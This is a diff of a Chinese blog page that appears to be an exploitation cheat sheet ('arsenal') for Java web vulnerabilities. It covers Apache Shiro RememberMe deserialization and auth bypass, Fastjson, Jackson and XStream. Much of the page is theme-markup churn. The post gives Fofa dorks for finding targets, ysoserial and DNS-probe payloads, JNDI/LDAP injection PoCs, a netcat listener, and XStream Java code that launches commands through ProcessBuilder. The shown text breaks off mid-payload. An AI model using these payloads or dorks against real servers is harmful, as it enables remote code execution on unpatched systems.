@@ -1,120 +1,175 @@
 <!DOCTYPE html>
-<html>
-  <head>
-  <meta http-equiv="content-type" content="text/html; charset=utf-8">
-  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
-  <meta name="description" content="缝合怪">
-  <meta name="keyword" content="hexo-theme, vuejs">
+<html lang="zh-CN">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicons.png">
+  <link rel="icon" type="image/png" href="/img/favicons.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
   
-    <link rel="shortcut icon" href="/css/images/logo.png">
+  <meta name="theme-color" content="black">
+  <meta name="description" content="">
+  <meta name="author" content="zy">
+  <meta name="keywords" content="">
+  <title>斗象科技-武器库 - copyking</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
   
-  <title>
     
-      斗象科技-武器库 | 缝合怪
-    
-  </title>
-  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
-  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
-  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css" />
   
-<link rel="stylesheet" href="/css/style.css">
 
-  
-  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
-  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
-  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
-  
-  
-  
-  
-    <!-- MathJax support START -->
-    <script type="text/x-mathjax-config">
-      MathJax.Hub.Config({
-        tex2jax: {
-          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
-          processEscapes: true,
-          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
-        }
-      });
-    </script>
-
-    <script type="text/x-mathjax-config">
-      MathJax.Hub.Queue(function() {
-        var all = MathJax.Hub.getAllJax(), i;
-        for (i=0; i < all.length; i += 1) {
-          all[i].SourceElement().parentNode.className += ' has-jax';
-        }
-      });
-    </script>
-    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
-    <!-- MathJax support END -->
   
 
 
-  
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_yg9cfy8wd6.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_pjno9b9zyxs.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
 <meta name="generator" content="Hexo 4.2.1"></head>
-<div class="wechat-share">
-  <img src="/css/images/logo.png" />
-</div>
 
-  <body>
-    <header class="header fixed-header">
-  <div class="header-container">
-    <a class="home-link" href="/">
-      <div class="logo"></div>
-      <span>缝合怪</span>
-    </a>
-    <ul class="right-list">
-      
-        <li class="list-item">
-          
-            <a href="/" class="item-link">Home</a>
-          
-        </li>
-      
-        <li class="list-item">
-          
-            <a href="/tags/" class="item-link">Tags</a>
-          
-        </li>
-      
-    </ul>
-    <div class="menu">
-      <span class="icon-bar"></span>
-      <span class="icon-bar"></span>
-      <span class="icon-bar"></span>
-    </div>
-    <div class="menu-mask">
-      <ul class="menu-list">
+
+<body>
+  <header style="height: 30vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>COPYKING</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
         
-          <li class="menu-item">
-            
-              <a href="/" class="menu-link">Home</a>
-            
-          </li>
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
         
-          <li class="menu-item">
-            
-              <a href="/tags/" class="menu-link">Tags</a>
-            
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
           </li>
         
       </ul>
     </div>
   </div>
-</header>
+</nav>
 
-    <div id="article-banner">
-  <h2>斗象科技-武器库</h2>
-  <p class="post-date">2020-07-08</p>
-  <div class="arrow-down">
-    <a href="javascript:;"></a>
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/header.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container text-center white-text fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+  <div class="mt-3 post-meta">
+    <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+    <time datetime="2020-07-08 14:09">
+      2020年7月8日 下午
+    </time>
   </div>
+
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      16.6k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      231
+       分钟
+    </span>
+  
+
+  
+  
 </div>
-<main class="app-body flex-box">
-  <!-- Article START -->
-  <article class="post-article">
-    <section class="markdown-content"><p>各种漏洞利用</p>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <article class="markdown-body">
+              <p>各种漏洞利用</p>
 <a id="more"></a>
 
 <h2 id="Apache-Shiro-RememberMe-反序列化导致的命令执行漏洞-Shiro-550-CVE-2016-4437"><a href="#Apache-Shiro-RememberMe-反序列化导致的命令执行漏洞-Shiro-550-CVE-2016-4437" class="headerlink" title="Apache Shiro RememberMe 反序列化导致的命令执行漏洞 (Shiro-550, CVE-2016-4437)"></a>Apache Shiro RememberMe 反序列化导致的命令执行漏洞 (Shiro-550, CVE-2016-4437)</h2><p><strong>1. 漏洞简介</strong></p>
@@ -124,7 +179,7 @@
 <p><strong>3. 漏洞指纹</strong></p>
 <p><code>set-Cookie: rememberMe=deleteMe</code><br>或者URL中有shiro字样<br>有一些时候服务器不会主动返回 <code>rememberMe=deleteMe</code>, 直接发包即可</p>
 <p><strong>4. Fofa Dork</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app="Apache-Shiro"</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"Apache-Shiro"</span></code></pre>
 
 <p><strong>5. 漏洞分析</strong></p>
 <p>【漏洞分析】Shiro RememberMe 1.2.4 反序列化导致的命令执行漏洞<br><a href="https://paper.seebug.org/shiro-rememberme-1-2-4/" target="_blank" rel="noopener">https://paper.seebug.org/shiro-rememberme-1-2-4/</a></p>
@@ -138,14 +193,14 @@
 <p>2.使用 <code>URLDNS</code> 进行检测提速</p>
 <p>使用适应性最强的<code>URLDNS</code>(这个不受JDK版本和安全策略影响, 除非网络限制不能出DNS)进行检测</p>
 <p>且可以使用<code>ysoserial</code>提前生成序列化内容</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar target/ysoserial-0.0.5-SNAPSHOT-all.jar URLDNS "http://1234567890.test.ceye.io" &gt; urldns.ser</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs lsl">java -jar target/ysoserial<span class="hljs-number">-0.0</span><span class="hljs-number">.5</span>-SNAPSHOT-all.jar URLDNS <span class="hljs-string">"http://1234567890.test.ceye.io"</span> &gt; urldns.ser</code></pre>
 
 <p>然后使用<code>占位符+目标url hash</code>的方法修改序列化内容中的<code>urldns</code>地址</p>
 <p>提高检测速度以及后续检测无需使用<code>ysoserial</code></p>
 <p>例如 <code>1234567890.test.ceye.io</code> 可以换成 <code>md5('www.qq.com').hexdigest() [:10].test.ceye.io</code></p>
 <p>也就是 <code>9d2c68d82d.test.ceye.io</code></p>
 <p>可以预先记录 hash</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9d2c68d82d www.qq.com</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs css">9<span class="hljs-selector-tag">d2c68d82d</span> <span class="hljs-selector-tag">www</span><span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span></code></pre>
 
 <p>然后进行hash查表就可以知道是<code>DNSLOG</code>来自哪个目标, 性能会提高不少</p>
 <p>3.已知目标使用了<code>Shiro</code>, 可以采取<code>Shiro-721</code>的报错逻辑来进行遍历<code>key</code> — 星光哥</p>
@@ -161,7 +216,7 @@
 <p><strong>3. 漏洞指纹</strong></p>
 <p><code>set-Cookie: rememberMe=deleteMe</code><br>URL中有shiro字样<br>有一些时候服务器不会主动返回 <code>rememberMe=deleteMe</code>, 直接发包即可</p>
 <p><strong>4. Fofa Dork</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app="Apache-Shiro"</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"Apache-Shiro"</span></code></pre>
 
 <p><strong>5. 漏洞分析</strong></p>
 <p>Shiro 721 Padding Oracle攻击漏洞分析 – 安全客, 安全资讯平台<br><a href="https://www.anquanke.com/post/id/193165" target="_blank" rel="noopener">https://www.anquanke.com/post/id/193165</a></p>
@@ -185,7 +240,7 @@
 <p><strong>3. 漏洞指纹</strong></p>
 <p><code>set-Cookie: rememberMe=deleteMe</code><br>或者URL中有shiro字样<br>有一些时候服务器不会主动返回 <code>rememberMe=deleteMe</code>, 直接发包即可</p>
 <p><strong>4. Fofa Dork</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app="Apache-Shiro"</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"Apache-Shiro"</span></code></pre>
 
 <p><strong>5. 漏洞分析</strong></p>
 <p>Shiro 权限绕过漏洞分析（CVE-2020-1957） – 斗象能力中心<br><a href="https://blog.riskivy.com/shiro-权限绕过漏洞分析（cve-2020-1957）/" target="_blank" rel="noopener">https://blog.riskivy.com/shiro-%e6%9d%83%e9%99%90%e7%bb%95%e8%bf%87%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90%ef%bc%88cve-2020-1957%ef%bc%89/</a></p>
@@ -206,7 +261,14 @@
 <p>Fastjson &lt; 1.2.48 (&lt;1.2.68?)</p>
 <p><strong>3. 漏洞指纹</strong></p>
 <p>可以通过DNS回显的方式检测后端是否使用Fastjson</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">{"@type":"java.net.Inet4Address", "val":"dnslog"}</span><br><span class="line">{"@type":"java.net.Inet6Address", "val":"dnslog"}</span><br><span class="line">{"@type":"java.net.InetSocketAddress"{"address":, "val":"dnslog"}}</span><br><span class="line">{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"dnslog"}}""}</span><br><span class="line">{{"@type":"java.net.URL", "val":"dnslog"}:"aaa"}</span><br><span class="line">Set[{"@type":"java.net.URL", "val":"dnslog"}]</span><br><span class="line">Set[{"@type":"java.net.URL", "val":"dnslog"}</span><br><span class="line">{{"@type":"java.net.URL", "val":"dnslog"}:0</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs perl">{<span class="hljs-string">"@type"</span>:<span class="hljs-string">"java.net.Inet4Address"</span>, <span class="hljs-string">"val"</span>:<span class="hljs-string">"dnslog"</span>}
+{<span class="hljs-string">"@type"</span>:<span class="hljs-string">"java.net.Inet6Address"</span>, <span class="hljs-string">"val"</span>:<span class="hljs-string">"dnslog"</span>}
+{<span class="hljs-string">"@type"</span>:<span class="hljs-string">"java.net.InetSocketAddress"</span>{<span class="hljs-string">"address"</span>:, <span class="hljs-string">"val"</span>:<span class="hljs-string">"dnslog"</span>}}
+{<span class="hljs-string">"@type"</span>:<span class="hljs-string">"com.alibaba.fastjson.JSONObject"</span>, {<span class="hljs-string">"@type"</span>: <span class="hljs-string">"java.net.URL"</span>, <span class="hljs-string">"val"</span>:<span class="hljs-string">"dnslog"</span>}}<span class="hljs-string">""</span>}
+{{<span class="hljs-string">"@type"</span>:<span class="hljs-string">"java.net.URL"</span>, <span class="hljs-string">"val"</span>:<span class="hljs-string">"dnslog"</span>}:<span class="hljs-string">"aaa"</span>}
+Set[{<span class="hljs-string">"@type"</span>:<span class="hljs-string">"java.net.URL"</span>, <span class="hljs-string">"val"</span>:<span class="hljs-string">"dnslog"</span>}]
+Set[{<span class="hljs-string">"@type"</span>:<span class="hljs-string">"java.net.URL"</span>, <span class="hljs-string">"val"</span>:<span class="hljs-string">"dnslog"</span>}
+{{<span class="hljs-string">"@type"</span>:<span class="hljs-string">"java.net.URL"</span>, <span class="hljs-string">"val"</span>:<span class="hljs-string">"dnslog"</span>}:<span class="hljs-number">0</span></code></pre>
 
 <p>可以通过DOS时间延迟或者报错回显的方式检测</p>
 <p>无损检测Fastjson DoS漏洞以及盲区分Fastjson与Jackson组件 – 斗象能力中心 (&lt;1.2.60)<br><a href="https://blog.riskivy.com/无损检测fastjson-dos漏洞以及盲区分fastjson与jackson组件/" target="_blank" rel="noopener">https://blog.riskivy.com/%e6%97%a0%e6%8d%9f%e6%a3%80%e6%b5%8bfastjson-dos%e6%bc%8f%e6%b4%9e%e4%bb%a5%e5%8f%8a%e7%9b%b2%e5%8c%ba%e5%88%86fastjson%e4%b8%8ejackson%e7%bb%84%e4%bb%b6/</a></p>
@@ -222,10 +284,10 @@
 <p>当javac版本和目标服务器差太多, 会报一个这样得到错误, 所以需要使用1.8的javac来编译Exploit.java</p>
 </blockquote>
 <p>这里并不需要更换jdk版本, 我们可以使用JDK降级编译的手法, 这样1.8的jdk也可以编译出来1.7版本的<code>.class</code> , 相信可以解决很多小伙伴的问题</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac -source 1.7 -target 1.7 Exploit.java</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs css"><span class="hljs-selector-tag">javac</span> <span class="hljs-selector-tag">-source</span> 1<span class="hljs-selector-class">.7</span> <span class="hljs-selector-tag">-target</span> 1<span class="hljs-selector-class">.7</span> <span class="hljs-selector-tag">Exploit</span><span class="hljs-selector-class">.java</span></code></pre>
 
 <p>1.2.47版本以下通杀Poc:</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{"name":{"@type":"java.lang.Class", "val":"com.sun.rowset.JdbcRowSetImpl"}, "f":{"@type":"com.sun.rowset.JdbcRowSetImpl", "dataSourceName":"ldap://asdfasfd/", "autoCommit":true}}, age:11}</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs groovy">{<span class="hljs-string">"name"</span>:{<span class="hljs-string">"@type"</span>:<span class="hljs-string">"java.lang.Class"</span>, <span class="hljs-string">"val"</span>:<span class="hljs-string">"com.sun.rowset.JdbcRowSetImpl"</span>}, <span class="hljs-string">"f"</span>:{<span class="hljs-string">"@type"</span>:<span class="hljs-string">"com.sun.rowset.JdbcRowSetImpl"</span>, <span class="hljs-string">"dataSourceName"</span>:<span class="hljs-string">"ldap://asdfasfd/"</span>, <span class="hljs-string">"autoCommit"</span>:<span class="hljs-literal">true</span>}}, <span class="hljs-string">age:</span><span class="hljs-number">11</span>}</code></pre>
 
 <p>其中<code>{"@type":"com.sun.rowset.JdbcRowSetImpl", "dataSourceName":"ldap://asdfasfd/", "autoCommit":true}</code>也可以替换成其他利用链</p>
 <p>2.优先使用LDAP协议</p>
@@ -237,12 +299,14 @@
 <p>如何绕过高版本JDK的限制进行JNDI注入 – FreeBuf专栏·安全引擎<br><a href="https://www.freebuf.com/column/207439.html" target="_blank" rel="noopener">https://www.freebuf.com/column/207439.html</a></p>
 <p><strong>7. 利用技巧</strong></p>
 <p>1.如何查看服务器的jdk版本呢, 这里也有个小技巧</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 80#[marshalsec中指定的HTTP端口]</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs nginx"><span class="hljs-attribute">nc</span> -lvvp <span class="hljs-number">80</span><span class="hljs-comment">#[marshalsec中指定的HTTP端口]</span></code></pre>
 
 <p>当服务器连接过来时, <code>User-Agent</code>中会标明当前服务器的JDK版本</p>
 <p>2.当发现一台Redis的数据中有@type字样时, 意味着autotype大概率是开的, 只要不存在黑名单中的利用链都可以用#[同理可以用在jackson上]</p>
 <p>fastjson/GenericFastJsonRedisSerializer.java at master · alibaba/fastjson<br><a href="https://github.com/alibaba/fastjson/blob/master/src/main/java/com/alibaba/fastjson/support/spring/GenericFastJsonRedisSerializer.java" target="_blank" rel="noopener">https://github.com/alibaba/fastjson/blob/master/src/main/java/com/alibaba/fastjson/support/spring/GenericFastJsonRedisSerializer.java</a></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public class GenericFastJsonRedisSerializer implements RedisSerializer&lt;Object&gt; {</span><br><span class="line">private final static ParserConfig defaultRedisConfig = new ParserConfig();</span><br><span class="line">static { defaultRedisConfig.setAutoTypeSupport(true);}</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs actionscript"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GenericFastJsonRedisSerializer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">RedisSerializer</span>&lt;<span class="hljs-title">Object</span>&gt; </span>{
+<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">static</span> ParserConfig defaultRedisConfig = <span class="hljs-keyword">new</span> ParserConfig();
+<span class="hljs-keyword">static</span> { defaultRedisConfig.setAutoTypeSupport(<span class="hljs-literal">true</span>);}</code></pre>
 
 <p>其他消息队列之类的都是同理</p>
 <p><strong>8. 防护方法</strong></p>
@@ -261,7 +325,7 @@
 <p><strong>6. 漏洞利用</strong></p>
 <p>learnjavabug/jackson/src/main/java/com/threedr3am/bug/jackson at master · threedr3am/learnjavabug<br><a href="https://github.com/threedr3am/learnjavabug/tree/master/jackson/src/main/java/com/threedr3am/bug/jackson" target="_blank" rel="noopener">https://github.com/threedr3am/learnjavabug/tree/master/jackson/src/main/java/com/threedr3am/bug/jackson</a></p>
 <p>POC</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">["ch.qos.logback.core.db.JNDIConnectionSource", {"jndiLocation":"ldap://localhost:43658/Calc"}]</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs json">[<span class="hljs-string">"ch.qos.logback.core.db.JNDIConnectionSource"</span>, {<span class="hljs-attr">"jndiLocation"</span>:<span class="hljs-string">"ldap://localhost:43658/Calc"</span>}]</code></pre>
 
 <p><strong>7. 利用技巧</strong></p>
 <p>1.把Fastjson的利用链拿过来改一改就可以用, 前提是环境中存在可用的利用链</p>
@@ -280,7 +344,95 @@
 <p>XStream反序列化组件攻击分析 | angelwhu_blog<br><a href="https://www.angelwhu.com/paper/2016/03/15/xstream-deserialization-component-attack-analysis/#0x04-Jenkins￥ﾈﾩ￧ﾔﾨ" target="_blank" rel="noopener">https://www.angelwhu.com/paper/2016/03/15/xstream-deserialization-component-attack-analysis/#0x04-Jenkins￥ﾈﾩ￧ﾔﾨ</a></p>
 <p><strong>6. 漏洞利用</strong></p>
 <p>XStream反序列化组件攻击分析 | angelwhu_blog<br><a href="https://www.angelwhu.com/paper/2016/03/15/xstream-deserialization-component-attack-analysis/#0x04-Jenkins￥ﾈﾩ￧ﾔﾨ" target="_blank" rel="noopener">https://www.angelwhu.com/paper/2016/03/15/xstream-deserialization-component-attack-analysis/#0x04-Jenkins￥ﾈﾩ￧ﾔﾨ</a></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">import com.thoughtworks.xstream.XStream;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class Main {</span><br><span class="line">// POC1</span><br><span class="line">    public static void main(String[] args) throws IOException {</span><br><span class="line">            XStream xStream = new XStream();</span><br><span class="line">            String payload = "&lt;sorted-set&gt;\n" +</span><br><span class="line">                    "    &lt;string&gt;foo&lt;/string&gt;\n" +</span><br><span class="line">                    "    &lt;dynamic-proxy&gt;\n" +</span><br><span class="line">                    "    &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;\n" +</span><br><span class="line">                    "        &lt;handler class=\"java.beans.EventHandler\"&gt;\n" +</span><br><span class="line">                    "            &lt;target class=\"java.lang.ProcessBuilder\"&gt;\n" +</span><br><span class="line">                    "                &lt;command&gt;\n" +</span><br><span class="line">                    "                    &lt;string&gt;cmd.exe&lt;/string&gt;\n" +</span><br><span class="line">                    "                    &lt;string&gt;/c&lt;/string&gt;\n" +</span><br><span class="line">                    "                    &lt;string&gt;calc&lt;/string&gt;\n" +</span><br><span class="line">                    "                &lt;/command&gt;\n" +</span><br><span class="line">                    "            &lt;/target&gt;\n" +</span><br><span class="line">                    "     &lt;action&gt;start&lt;/action&gt;"+</span><br><span class="line">                    "        &lt;/handler&gt;\n" +</span><br><span class="line">                    "    &lt;/dynamic-proxy&gt;\n" +</span><br><span class="line">                    "&lt;/sorted-set&gt;\n";</span><br><span class="line">//POC2</span><br><span class="line">//        String payload = "&lt;java.util.PriorityQueue serialization=\"custom\"&gt;\n" +</span><br><span class="line">//                "  &lt;unserializable-parents/&gt;\n" +</span><br><span class="line">//                "  &lt;java.util.PriorityQueue&gt;\n" +</span><br><span class="line">//                "    &lt;default&gt;\n" +</span><br><span class="line">//                "      &lt;size&gt;2&lt;/size&gt;\n" +</span><br><span class="line">//                "      &lt;comparator class=\"org.apache.commons.beanutils.BeanComparator\"&gt;\n" +</span><br><span class="line">//                "        &lt;property&gt;databaseMetaData&lt;/property&gt;\n" +</span><br><span class="line">//                "        &lt;comparator class=\"java.util.Collections$ReverseComparator\"/&gt;\n" +</span><br><span class="line">//                "      &lt;/comparator&gt;\n" +</span><br><span class="line">//                "    &lt;/default&gt;\n" +</span><br><span class="line">//                "    &lt;int&gt;3&lt;/int&gt;\n" +</span><br><span class="line">//                "    &lt;com.sun.rowset.JdbcRowSetImpl serialization=\"custom\"&gt;\n" +</span><br><span class="line">//                "      &lt;javax.sql.rowset.BaseRowSet&gt;\n" +</span><br><span class="line">//                "        &lt;default&gt;\n" +</span><br><span class="line">//                "          &lt;concurrency&gt;1008&lt;/concurrency&gt;\n" +</span><br><span class="line">//                "          &lt;escapeProcessing&gt;true&lt;/escapeProcessing&gt;\n" +</span><br><span class="line">//                "          &lt;fetchDir&gt;1000&lt;/fetchDir&gt;\n" +</span><br><span class="line">//                "          &lt;fetchSize&gt;0&lt;/fetchSize&gt;\n" +</span><br><span class="line">//                "          &lt;isolation&gt;2&lt;/isolation&gt;\n" +</span><br><span class="line">//                "          &lt;maxFieldSize&gt;0&lt;/maxFieldSize&gt;\n" +</span><br><span class="line">//                "          &lt;maxRows&gt;0&lt;/maxRows&gt;\n" +</span><br><span class="line">//                "          &lt;queryTimeout&gt;0&lt;/queryTimeout&gt;\n" +</span><br><span class="line">//                "          &lt;readOnly&gt;true&lt;/readOnly&gt;\n" +</span><br><span class="line">//                "          &lt;rowSetType&gt;1004&lt;/rowSetType&gt;\n" +</span><br><span class="line">//                "          &lt;showDeleted&gt;false&lt;/showDeleted&gt;\n" +</span><br><span class="line">//                "          &lt;dataSource&gt;ldap://ip:1389/Object&lt;/dataSource&gt;\n" +</span><br><span class="line">//                "          &lt;params/&gt;\n" +</span><br><span class="line">//                "        &lt;/default&gt;\n" +</span><br><span class="line">//                "      &lt;/javax.sql.rowset.BaseRowSet&gt;\n" +</span><br><span class="line">//                "      &lt;com.sun.rowset.JdbcRowSetImpl&gt;\n" +</span><br><span class="line">//                "        &lt;default&gt;\n" +</span><br><span class="line">//                "          &lt;iMatchColumns&gt;\n" +</span><br><span class="line">//                "            &lt;int&gt;-1&lt;/int&gt;\n" +</span><br><span class="line">//                "            &lt;int&gt;-1&lt;/int&gt;\n" +</span><br><span class="line">//                "            &lt;int&gt;-1&lt;/int&gt;\n" +</span><br><span class="line">//                "            &lt;int&gt;-1&lt;/int&gt;\n" +</span><br><span class="line">//                "            &lt;int&gt;-1&lt;/int&gt;\n" +</span><br><span class="line">//                "            &lt;int&gt;-1&lt;/int&gt;\n" +</span><br><span class="line">//                "            &lt;int&gt;-1&lt;/int&gt;\n" +</span><br><span class="line">//                "            &lt;int&gt;-1&lt;/int&gt;\n" +</span><br><span class="line">//                "            &lt;int&gt;-1&lt;/int&gt;\n" +</span><br><span class="line">//                "            &lt;int&gt;-1&lt;/int&gt;\n" +</span><br><span class="line">//                "          &lt;/iMatchColumns&gt;\n" +</span><br><span class="line">//                "          &lt;strMatchColumns&gt;\n" +</span><br><span class="line">//                "            &lt;string&gt;foo&lt;/string&gt;\n" +</span><br><span class="line">//                "            &lt;null/&gt;\n" +</span><br><span class="line">//                "            &lt;null/&gt;\n" +</span><br><span class="line">//                "            &lt;null/&gt;\n" +</span><br><span class="line">//                "            &lt;null/&gt;\n" +</span><br><span class="line">//                "            &lt;null/&gt;\n" +</span><br><span class="line">//                "            &lt;null/&gt;\n" +</span><br><span class="line">//                "            &lt;null/&gt;\n" +</span><br><span class="line">//                "            &lt;null/&gt;\n" +</span><br><span class="line">//                "            